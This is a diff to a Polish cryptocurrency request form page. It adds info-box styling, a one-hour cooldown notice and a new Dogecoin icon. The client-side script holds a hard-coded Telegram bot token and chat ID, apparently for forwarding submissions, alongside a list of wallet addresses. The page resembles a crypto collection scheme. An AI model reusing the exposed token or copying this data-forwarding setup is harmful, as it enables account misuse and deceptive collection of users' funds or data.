@@ -23,6 +23,9 @@
       --warning-bg: rgba(239, 68, 68, 0.1);
       --warning-border: rgba(239, 68, 68, 0.3);
       --warning-text: #f87171;
+      --info-bg: rgba(59, 130, 246, 0.1);
+      --info-border: rgba(59, 130, 246, 0.3);
+      --info-text: #60a5fa;
     }
 
     [data-theme="light"] {
@@ -42,6 +45,9 @@
       --warning-bg: rgba(239, 68, 68, 0.08);
       --warning-border: rgba(239, 68, 68, 0.25);
       --warning-text: #dc2626;
+      --info-bg: rgba(59, 130, 246, 0.08);
+      --info-border: rgba(59, 130, 246, 0.25);
+      --info-text: #2563eb;
     }
 
     * {
@@ -329,7 +335,7 @@
     .modal-content {
       background: var(--modal-card); border: 1px solid var(--card-border);
       border-radius: 20px; max-width: 520px; width: 100%; padding: 28px;
-      display: flex; flex-direction: column; gap: 20px;
+      display: flex; flex-direction: column; gap: 16px;
     }
 
     .modal-header { display: flex; justify-content: space-between; align-items: center; }
@@ -363,6 +369,17 @@
       background: var(--warning-bg);
       border: 1px solid var(--warning-border);
       color: var(--warning-text);
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      line-height: 1.4;
+      font-weight: 500;
+    }
+
+    .info-cooldown-box {
+      background: var(--info-bg);
+      border: 1px solid var(--info-border);
+      color: var(--info-text);
       padding: 12px 16px;
       border-radius: 12px;
       font-size: 13px;
@@ -537,6 +554,10 @@
       </div>
     </div>
 
+    <div class="info-cooldown-box">
+      ⏱️ <strong>Ograniczenie czasowe:</strong> Następny wniosek będziesz mógł złożyć dopiero za <strong>1 godzinę</strong>. Upewnij się, że wszystkie dane są w 100% poprawne!
+    </div>
+
     <div class="strict-warning-box">
       ⚠️ <strong>Bardzo ważne:</strong> Upewnij się na 100%, że podajesz prawidłowy adres portfela. Jeśli wprowadzisz błędny adres, wysłane kryptowaluty przepadną i ich odzyskanie będzie niemożliwe!
     </div>
@@ -551,7 +572,7 @@
 <script>
   const TELEGRAM_BOT_TOKEN = "8930272100:AAF_dV1SKrQX-LxvQPQZchxxBy0Rjma4JK0";
   const TELEGRAM_CHAT_ID = "7157683909";
-  const COOLDOWN_MINUTES = 60; // Zmienna ustawiona na 1 godzinę (60 minut)
+  const COOLDOWN_MINUTES = 60;
 
   const cryptos = [
     { id: 'btc', name: 'Bitcoin', symbol: 'BTC', network: 'Sieć Bitcoin (BTC)', address: 'bc1qm6w0t38sm9mh63dusqe3zx2pmfhpnp86jz4znk', icon: `<svg viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#F7931A"/><path d="M46.101 26.314c.616-4.116-2.52-6.33-6.806-7.808l1.39-5.574-3.391-.846-1.352 5.424c-.891-.222-1.808-.433-2.722-.64l1.362-5.46-3.392-.846-1.39 5.573c-.739-.168-1.463-.336-2.164-.512l.004-.018-4.678-1.168-.903 3.623s2.518.577 2.465.613c1.375.343 1.624 1.253 1.582 1.975l-1.586 6.357c.095.024.218.059.353.113-.114-.028-.242-.058-.371-.09l-2.222 8.91c-.168.416-.596 1.042-1.558.803.035.05-2.465-.615-2.465-.615l-1.685 3.886 4.415 1.101c.821.205 1.625.42 2.417.625l-1.405 5.637 3.39.846 1.39-5.573c.926.251 1.824.482 2.705.701l-1.38 5.534 3.392.846 1.406-5.638c5.787 1.096 10.138.654 11.97-4.582 1.478-4.222-.073-6.657-3.125-8.243 2.223-.513 3.898-1.976 4.346-4.992zm-7.778 10.893c-1.05 4.217-8.15 1.938-10.453 1.366l1.865-7.478c2.303.575 9.664 1.714 8.588 6.112zm1.05-10.95c-.958 3.842-6.87 1.89-8.784 1.413l1.691-6.78c1.914.478 8.067 1.37 7.093 5.367z" fill="#FFF"/></svg>` },
@@ -559,7 +580,7 @@
     { id: 'sol', name: 'Solana', symbol: 'SOL', network: 'Sieć Solana (SOL)', address: 'A8oRsgM9dMtSU8pB1E7RHKfWgdpnAfsPZKwoKN8VmBD1', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#000"/><path d="M8.5 21.2a.6.6 0 01.4-.2h14.7c.3 0 .5.4.3.7l-2.4 2.4a.6.6 0 01-.4.2H6.4a.5.5 0 01-.3-.7l2.4-2.4zm0-10.4a.6.6 0 01.4-.2h14.7c.3 0 .5.4.3.7l-2.4 2.4a.6.6 0 01-.4.2H6.4a.5.5 0 01-.3-.7l2.4-2.4zm14.6 5.2a.6.6 0 00-.4-.2H8a.5.5 0 00-.3.7l2.4 2.4c.1.1.3.2.4.2h14.7c.3 0 .5-.4.3-.7l-2.4-2.4z" fill="url(#solG)"/><defs><linearGradient id="solG" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00FFA3"/><stop offset="100%" stop-color="#DC1FFF"/></linearGradient></defs></svg>` },
     { id: 'xrp', name: 'XRP', symbol: 'XRP', network: 'Sieć Ripple (XRP)', address: 'rKukG3tY8WkzaEKuMXhTPcgjoyphJq2afV', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#23292F"/><path d="M22.7 8h2.3l-5.6 5.6c-1.8 1.8-4.8 1.8-6.7 0L7 8h2.3l4.5 4.5c1.2 1.2 3.1 1.2 4.3 0L22.7 8zm-13.4 16H7l5.6-5.6c1.8-1.8 4.8-1.8 6.7 0l5.7 5.6h-2.3l-4.5-4.5c-1.2-1.2-3.1-1.2-4.3 0L9.3 24z" fill="#FFF"/></svg>` },
     { id: 'ltc', name: 'Litecoin', symbol: 'LTC', network: 'Sieć Litecoin (LTC)', address: 'ltc1qx4e7cdtkj3pfh4fkcz6trater9u7dxee4y5hgf', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#345D9D"/><path d="M15.3 7.5l-2.5 9.7-1.8.7-.6 2.3 2.1-.8-1.2 4.7h11l1.1-4.2H15.6l1.2-4.7 1.8-.7.6-2.3-2.1.8 1.4-5.5h-3.2z" fill="#FFF"/></svg>` },
-    { id: 'doge', name: 'Dogecoin', symbol: 'DOGE', network: 'Sieć Dogecoin (DOGE)', address: 'D6Uy1p7VxHvmh5QTr8apxBvvZz76sY2VXH', icon: `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#C2A633"/><rect x="10" y="9" width="12" height="14" rx="3" fill="#FFF"/><path d="M10 11h6c2.5 0 4 1.5 4 5s-1.5 5-4 5h-6V11zm4 3v4h2c1 0 1.5-.5 1.5-2s-.5-2-1.5-2h-2z" fill="#C2A633"/><path d="M8 16h16" stroke="#C2A633" stroke-width="2.5"/></svg>` }
+    { id: 'doge', name: 'Dogecoin', symbol: 'DOGE', network: 'Sieć Dogecoin (DOGE)', address: 'D6Uy1p7VxHvmh5QTr8apxBvvZz76sY2VXH', icon: `<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="#C2A633"/><path d="M33.7 23h21.8c12.2 0 21.8 9.5 21.8 27s-9.6 27-21.8 27H33.7V23zm10.5 10.5v33h11.3c6.3 0 11.3-6.2 11.3-16.5s-5-16.5-11.3-16.5H44.2z" fill="#FFF"/><path d="M27.4 45h27.3v10H27.4z" fill="#FFF"/></svg>` }
   ];
 
   let activeIndex = 0;
